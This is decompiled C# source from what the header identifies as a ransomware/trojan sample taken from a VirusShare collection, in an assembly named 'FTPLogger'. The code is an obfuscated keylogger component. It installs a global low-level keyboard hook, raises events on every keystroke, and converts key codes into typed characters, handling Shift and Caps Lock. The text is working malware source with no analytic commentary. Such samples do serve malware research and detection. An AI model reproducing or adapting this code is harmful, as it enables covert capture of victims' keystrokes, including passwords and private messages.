// Decompiled with JetBrains decompiler
// Type: 
// Assembly: FTPLogger, Version=1.5.3.0, Culture=neutral, PublicKeyToken=null
// MVID: FD4E7A7F-A947-48A6-8854-D02BB59892CD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00019-msil\Trojan-Ransom.Win32.Blocker.jfhu-27d1827589859d42172be9d94e6a9e09d79adabcba942daefda1415d2ce69b43.exe

using Microsoft.VisualBasic.CompilerServices;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public sealed class \u0008
{
  private static \u0008.\u0005 \u0002;
  private static \u0008.\u0008 \u0003;
  private static \u0008.\u0006 \u0005;
  private static int \u0008;
  private static \u0008.\u0003 \u0006;

  [DebuggerNonUserCode]
  public \u0008()
  {
  }

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0002(int _param0, \u0008.\u0003 _param1, int _param2, int _param3);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int CallNextHookEx(
    int _param0,
    int _param1,
    int _param2,
    \u0008.\u0002 _param3);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int UnhookWindowsHookEx(int _param0);

  [DebuggerNonUserCode]
  [MethodImpl(MethodImplOptions.Synchronized)]
  public static void \u0002(\u0008.\u0005 _param0) => \u0008.\u0002 += _param0;

  [DebuggerNonUserCode]
  [MethodImpl(MethodImplOptions.Synchronized)]
  public static void \u0003(\u0008.\u0005 _param0) => \u0008.\u0002 -= _param0;

  [DebuggerNonUserCode]
  [MethodImpl(MethodImplOptions.Synchronized)]
  public static void \u0002(\u0008.\u0008 _param0) => \u0008.\u0003 += _param0;

  [DebuggerNonUserCode]
  [MethodImpl(MethodImplOptions.Synchronized)]
  public static void \u0003(\u0008.\u0008 _param0) => \u0008.\u0003 -= _param0;

  [DebuggerNonUserCode]
  [MethodImpl(MethodImplOptions.Synchronized)]
  public static void \u0002(\u0008.\u0006 _param0) => \u0008.\u0005 += _param0;

  [DebuggerNonUserCode]
  [MethodImpl(MethodImplOptions.Synchronized)]
  public static void \u0003(\u0008.\u0006 _param0) => \u0008.\u0005 -= _param0;

  public void \u0002()
  {
    \u0008.\u0006 = new \u0008.\u0003(this.\u0002);
    \u0008.\u0008 = \u0008.\u0002(13, \u0008.\u0006, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
  }

  private int \u0002(int _param1, int _param2, ref \u0008.\u0002 _param3)
  {
    if (_param1 == 0)
    {
      switch (_param2)
      {
        case 256:
        case 260:
          \u0008.\u0005 obj1 = \u0008.\u0002;
          if (obj1 != null)
          {
            obj1((Keys) _param3.\u0002);
            break;
          }
          break;
        case 257:
        case 261:
          \u0008.\u0008 obj2 = \u0008.\u0003;
          if (obj2 != null)
          {
            obj2((Keys) _param3.\u0002);
            break;
          }
          break;
      }
    }
    return \u0008.CallNextHookEx(\u0008.\u0008, _param1, _param2, _param3);
  }

  public void \u0003()
  {
    \u0008.UnhookWindowsHookEx(\u0008.\u0008);
    // ISSUE: explicit finalizer call
    this.Finalize();
  }

  public string \u0002(Keys _param1)
  {
    Keys keys = _param1;
    if (keys >= Keys.A && keys <= Keys.Z)
    {
      if (Control.IsKeyLocked(Keys.Capital))
        return _param1.ToString();
      return (Control.ModifierKeys & Keys.Shift) != Keys.None ? _param1.ToString() : _param1.ToString().ToLower();
    }
    if (keys >= Keys.D0 && keys <= Keys.D9)
    {
      if ((Control.ModifierKeys & Keys.Shift) == Keys.None)
        return _param1.ToString().Replace(\u000F.\u0002(-2014548022), string.Empty);
      string Left = _param1.ToString();
      if (Operators.CompareString(Left, \u000F.\u0002(-2014548120), false) == 0)
        return \u000F.\u0002(-2014548141);
      if (Operators.CompareString(Left, \u000F.\u0002(-2014548133), false) == 0)
        return \u000F.\u0002(-2014548158);
      if (Operators.CompareString(Left, \u000F.\u0002(-2014548150), false) == 0)
        return \u000F.\u0002(-2014548171);
      if (Operators.CompareString(Left, \u000F.\u0002(-2014548163), false) == 0)
        return \u000F.\u0002(-2014548188);
      if (Operators.CompareString(Left, \u000F.\u0002(-2014548180), false) == 0)
        return \u000F.\u0002(-2014548201);
      if (Operators.CompareString(Left, \u000F.\u0002(-2014548193), false) == 0)
        return \u000F.\u0002(-2014548218);
      if (Operators.CompareString(Left, \u000F.\u0002(-2014548210), false) == 0)
        return \u000F.\u0002(-2014547975);
      if (Operators.CompareString(Left, \u000F.\u0002(-2014547999), false) == 0)
        return \u000F.\u0002(-2014548818);
      if (Operators.CompareString(Left, \u000F.\u0002(-2014547992), false) == 0)
        return \u000F.\u0002(-2014548013);
      if (Operators.CompareString(Left, \u000F.\u0002(-2014548005), false) == 0)
        return \u000F.\u0002(-2014548030);
    }
    else
    {
      if (keys >= Keys.NumPad0 && keys <= Keys.NumPad9)
        return _param1.ToString().Replace(\u000F.\u0002(-2014548046), string.Empty);
      if (keys >= Keys.Multiply && keys <= Keys.Divide)
      {
        string Left = _param1.ToString();
        if (Operators.CompareString(Left, \u000F.\u0002(-2014548063), false) == 0)
          return \u000F.\u0002(-2014548052);
        if (Operators.CompareString(Left, \u000F.\u0002(-2014548076), false) == 0)
          return \u000F.\u0002(-2014548818);
        if (Operators.CompareString(Left, \u000F.\u0002(-2014548091), false) == 0)
          return \u000F.\u0002(-2014548366);
        if (Operators.CompareString(Left, \u000F.\u0002(-2014548358), false) == 0)
          return \u000F.\u0002(-2014548380);
        if (Operators.CompareString(Left, \u000F.\u0002(-2014548372), false) == 0)
          return \u000F.\u0002(-2014548390);
      }
      else
      {
        if (keys == Keys.Space)
          return \u000F.\u0002(-2014548414);
        if (keys >= Keys.OemSemicolon && keys <= Keys.OemQuotes)
        {
          if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
          {
            string Left = _param1.ToString();
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548406), false) == 0)
              return \u000F.\u0002(-2014548421);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548445), false) == 0)
              return \u000F.\u0002(-2014548380);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548463), false) == 0)
              return \u000F.\u0002(-2014548473);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548465), false) == 0)
              return \u000F.\u0002(-2014548232);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548256), false) == 0)
              return \u000F.\u0002(-2014548243);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548267), false) == 0)
              return \u000F.\u0002(-2014548258);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548282), false) == 0)
              return \u000F.\u0002(-2014548301);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548293), false) == 0)
              return \u000F.\u0002(-2014548312);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548336), false) == 0)
              return \u000F.\u0002(-2014548352);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548344), false) == 0)
              return \u000F.\u0002(-2014549638);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014549662), false) == 0)
              return \u000F.\u0002(-2014549677);
          }
          else
          {
            string Left = _param1.ToString();
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548406), false) == 0)
              return \u000F.\u0002(-2014548366);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548445), false) == 0)
              return \u000F.\u0002(-2014549669);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548463), false) == 0)
              return \u000F.\u0002(-2014549693);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548465), false) == 0)
              return \u000F.\u0002(-2014549685);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548256), false) == 0)
              return \u000F.\u0002(-2014548979);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548267), false) == 0)
              return \u000F.\u0002(-2014549709);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548282), false) == 0)
              return \u000F.\u0002(-2014549701);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548293), false) == 0)
              return \u000F.\u0002(-2014549725);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548336), false) == 0)
              return \u000F.\u0002(-2014548390);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014548344), false) == 0)
              return \u000F.\u0002(-2014548052);
            if (Operators.CompareString(Left, \u000F.\u0002(-2014549662), false) == 0)
              return \u000F.\u0002(-2014549717);
          }
        }
        else
          return keys == Keys.Return ? \u000F.\u0002(-2014548127) : \u000F.\u0002(-2014548312) + _param1.ToString() + \u000F.\u0002(-2014548352);
      }
    }
    return (string) null;
  }

  private struct \u0002
  {
    public int \u0002;
    public int \u0003;
    public int \u0005;
    public int \u0008;
    public int \u0006;
  }

  private delegate int \u0003(int _param1, int _param2, ref \u0008.\u0002 _param3);

  public delegate void \u0005(Keys _param1);

  public delegate void \u0006();

  public delegate void \u0008(Keys _param1);
}
